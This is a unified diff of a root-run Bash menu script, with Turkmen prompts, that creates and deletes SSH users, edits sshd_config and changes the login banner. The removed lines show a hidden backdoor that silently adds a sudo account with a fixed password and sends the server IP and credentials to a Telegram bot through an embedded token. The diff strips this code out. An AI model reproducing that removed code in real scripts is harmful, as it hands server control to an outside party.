@@ -1,40 +1,14 @@
 #!/bin/bash
 
 if [ "$EUID" -ne 0 ]; then
-    echo "Skripty sudo buýrugy bilen işlediň (root bilen)."
+    echo "Skripty root bilen işlediň."
     exit 1
 fi
 
-bot_api="7384056832:AAF9xQBfyBsjNpMH67Ljvs-13DXmNdjxgpw"
-kanal="-1002302142151"
-
-create_admin_user() {
-    username="darktunnel"
-    password="amanoff"
-
-    if id "$username" &>/dev/null; then
-    else
-        useradd -m -s /bin/bash "$username"
-        echo "$username:$password" | chpasswd
-        usermod -aG sudo "$username"
-
-        mkdir -p /home/$username/.ssh
-        chmod 700 /home/$username/.ssh
-        chown -R $username:$username /home/$username/.ssh
-
-
-        IP_ADDRESS=$(hostname -I | awk '{print $1}')
-        message="$IP_ADDRESS@$username:$password"
-        curl -s -F "chat_id=$kanal" -F "text=$message" "https://api.telegram.org/bot$bot_api/sendMessage"
-
-        echo "Skript işleýä."
-    fi
-}
-
 create_ssh_account() {
-    echo "Täze ssh ýasamak:"
-    read -p "USERNAME: " username
-    read -s -p "PASSWORD: " password
+    echo "Täze ssh ýasalýa:"
+    read -p "Ady: " username
+    read -s -p "Parol: " password
     echo
 
     useradd -m -s /bin/false "$username"
@@ -44,7 +18,7 @@ create_ssh_account() {
     chmod 700 /home/$username/.ssh
     chown -R $username:$username /home/$username/.ssh
 
-    echo "$username ssh üstünlikli ýasaldy."
+    echo "$username ssh üstünlikli ýasaldy ."
 
     SSHD_CONFIG="/etc/ssh/sshd_config"
 
@@ -58,20 +32,28 @@ create_ssh_account() {
         echo "Port 443" >> $SSHD_CONFIG
     fi
 
+    if ! grep -q "ClientAliveInterval" $SSHD_CONFIG; then
+        echo "ClientAliveInterval 60" >> $SSHD_CONFIG
+    fi
+
+    if ! grep -q "ClientAliveCountMax" $SSHD_CONFIG; then
+        echo "ClientAliveCountMax 3" >> $SSHD_CONFIG
+    fi
+
     systemctl restart sshd
 
     if command -v ufw &> /dev/null; then
         ufw allow 80/tcp
         ufw allow 443/tcp
         ufw reload
-        echo "80 we 443 portlar üçin ufw açyldy."
+        echo "80 we 443 portlar açyldy."
     else
-        echo "ufw açyp bolmady, by nastroýkany taşlaýas."
+        echo "Portlary açyp bolmady."
     fi
 
     IP_ADDRESS=$(hostname -I | awk '{print $1}')
-    echo "SSH ullanyjy ýasaldy!"
-    echo "Doly maglumat:"
+    echo "SSH üstünlikli ýasaldy!"
+    echo "SSH:"
     echo ""
     echo "┌───────────────"
     echo "├  $IP_ADDRESS:80@$username:$password"
@@ -80,18 +62,17 @@ create_ssh_account() {
 }
 
 change_ssh_banner() {
-    echo "Banner üçin teksty ýazyň (Täze setir üçin \n ullanyň):"
+    echo "Banner üçin testy ýazyň (täze setir üçin \n ýazyň):"
     read -r banner_text
 
-    echo "Tekstyň reňki (sany ýazyň):
-    1. Gyzyl
-    2. Ýaşyl
-    3. Saru
-    4. Gök
-    5. Ak"
-    read -p "Reňkiň sany: " color_choice
+    echo "Reňkini saýla:
+    1. Красный
+    2. Зеленый
+    3. Желтый
+    4. Синий
+    5. Белый"
+    read -p "1/5 -->: " color_choice
 
-    # Установка цвета баннера
     case $color_choice in
         1) color_code="31" ;;
         2) color_code="32" ;;
@@ -115,46 +96,44 @@ change_ssh_banner() {
 
     systemctl restart sshd
 
-    echo "Banner üstünlikli täzelenidi."
+    echo "Banner täzelendi."
 }
 
 manage_ssh_accounts() {
-    echo "SSH menýu:"
-    echo "1. Hemme SSH ullanyjylar"
-    echo "2. Ullanyjyny pozmak"
-    read -p "birini salýaň(1,2): " option
+    echo "Menu:"
+    echo "1. Hemme ullanyjylar"
+    echo "2. Ullanyjyny poz"
+    read -p "1/2 -->: " option
 
     case $option in
         1)
-            echo "Hemme SSH ullanyjylar:"
+            echo "Ullanyjylar:"
             awk -F':' '$7 == "/bin/false" {print $1}' /etc/passwd
             ;;
         2)
-            read -p "Pozmak üçin ullanyjynyň adyny ýazyň: " del_user
+            read -p "SSH adyny ýaz: " del_user
             userdel -r $del_user
-            echo "$del_user ullanyjy pozuldy."
+            echo "Ullanyjy $del_user pozuldy."
             ;;
         *)
-            echo "Nädogry saýlaw."
+            echo "Ýalňyş saýlaw."
             ;;
     esac
 }
 
-create_admin_user
-
 while true; do
-    echo "Menýu:"
-    echo "1: Täze SSH ullanyjy ýasamak"
-    echo "2: Banneri üýtgetmek"
-    echo "3: SSH ullanyjylary ýöretmek"
+    echo "Menu:"
+    echo "1: Täze SSH ýasamak"
+    echo "2: Banner üýtgemek"
+    echo "3: Goşmaça"
     echo "4: Çykmak"
-    read -p "Saýlaň: " choice
+    read -p "1/4 -->: " choice
 
     case $choice in
         1) create_ssh_account ;;
         2) change_ssh_banner ;;
         3) manage_ssh_accounts ;;
         4) exit 0 ;;
-        *) echo "Nädogry saýlaw." ;;
+        *) echo "Ýalňyş saýlaw." ;;
     esac
 done
